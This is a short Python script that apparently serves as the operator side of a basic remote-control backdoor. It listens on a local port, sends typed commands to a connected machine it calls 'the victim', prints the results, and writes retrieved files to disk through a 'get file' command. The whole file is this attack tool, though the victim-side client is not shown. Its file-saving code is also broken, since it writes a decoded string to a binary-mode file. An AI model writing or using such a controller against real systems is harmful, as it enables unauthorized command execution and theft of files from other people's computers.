import socket


def server():
    s = socket.socket()
    s.bind(('127.0.0.1', 8965))

    s.listen(1)
    client_socket, adress = s.accept()
    print("Connection from: " + str(adress))
    while True:
        command = input('Please enter a command to the victim')
        client_socket.send(command.encode('utf-8'))
        data = client_socket.recv(1024).decode('utf-8')
        if 'get file ' in command:
            command = command.replace('get file ', '')
            with open(command, 'wb')as file:
                file.writelines(data)

        print('From victim: ' + data)
    client_socket.close()


if __name__ == '__main__':
    server()
